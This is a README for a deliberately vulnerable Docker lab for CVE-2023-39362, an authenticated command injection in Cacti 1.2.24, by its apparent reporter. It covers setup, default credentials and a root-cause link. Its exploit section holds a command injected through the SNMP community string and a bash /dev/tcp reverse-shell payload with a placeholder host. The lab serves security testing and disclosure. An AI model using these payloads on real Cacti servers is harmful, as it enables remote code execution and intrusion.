# Cacti v1.2.24 authenticated command injection (CVE-2023-39362) vulnerable application

This is a vulnerable application to test the exploit for the **Cacti** vulnerability (**CVE-2023-39362**).

## WARNING!

**This application contains serious security vulnerabilities. Run it at your own risk! It is recommended using a backed-up and sheltered environment (such as a VM with a recent snapshot and host-only networking). Do not upload this application to any Internet facing servers, as they will be compromised.**

***DISCLAIMER*: I do not take responsibility for the way in which any one uses this application. The only purpose of this application is to be a test scenario for the CVE-2023-39362 exploit and it should not be used maliciously. If your server is compromised via an installation of this application it is not my responsibility, it is the responsibility of the person(s) who uploaded and installed it.**

## Vulnerability info

* **CVE-ID**: CVE-2023-39362
* **Link**: [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39362](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39362)
* **Description**: In Cacti 1.2.24, under certain conditions, an authenticated privileged user, can use a malicious string in the SNMP options of a Device, performing command injection and obtaining remote code execution on the underlying server.

## Usage

Here the steps to **setup** the environment:
1. Launch `docker compose up -d` to start composition.
2. You can finalize the steps by browsing to [http://127.0.0.1/cacti](http://127.0.0.1/cacti) to start the Cacti initialization wizard. If you get an error referring to the database, just wait a little bit and refresh the page.
3. Default credentials are `admin`/`admin`.
4. Press "*Next*" to all the buttons during the wizard, choosing options accordingly. All the defaults should be fine and all the mandatory prerequisites should be satisfied.
5. After the installation, login as the `admin`.
6. Go to "*Console*" > "*Configuration*" > "*User*".
7. Click on the `guest` user.
8. "*Enable*" it, set a password, disable the "*Must Change Password at Next Login*" if you want.
9. Click on the "*Save*" button.
10. Go to the "*Permissions*" section.
11. Under "*General Administration*", enable "*Console Access*" and "*Sites/Devices/Data*".
12. Click on the "*Save*" button.
13. Logout and re-login as `guest` to try the exploit.

The container will be called `vuln-cacti`.

The hostname for a test SNMP device is `monitored_snmp_device`.

To **teardown** the environment use `docker compose down` command.

The official installation guide of Cacti can be found [here](https://docs.cacti.net/README.md#cacti-installation).

## Root cause

A detailed root cause of the vulnerability is available in the [original security advisory](https://github.com/Cacti/cacti/security/advisories/GHSA-g6ff-58cj-x3cp) or in [my blog post](https://m3ssap0.github.io/2023/07/04/cacti-authenticated-command-injection-snmp.html).

## Exploit

(This is *only one possible* exploit)

1. Go to "*Console*" > "*Create*" > "*New Device*".
2. Create a Device that supports SNMP version 1 or 2.
3. Ensure that the Device has Graphs with one or more templates of:
    * "*Net-SNMP - Combined SCSI Disk Bytes*"
    * "*Net-SNMP - Combined SCSI Disk I/O*"
    * (Creating the Device from the template "*Net-SNMP Device*" will satisfy the Graphs prerequisite)
4. In the "*SNMP Options*", for the "*SNMP Community String*" field, use a value like this: `public\' ; touch /tmp/m3ssap0 ; \'`.
5. Click the "*Create*" button.
6. Check under `/tmp` the presence of the created file.

To obtain a reverse shell, a payload like the following can be used.
```
public\' ; bash -c "exec bash -i &>/dev/tcp/<host>/<port> <&1" ; \'
```

## Authors

* **Antonio Francesco Sardella** - *vulnerability reporter* - [m3ssap0](https://github.com/m3ssap0)

## License

This project is licensed under the Unlicense - see the **LICENSE** file for details.
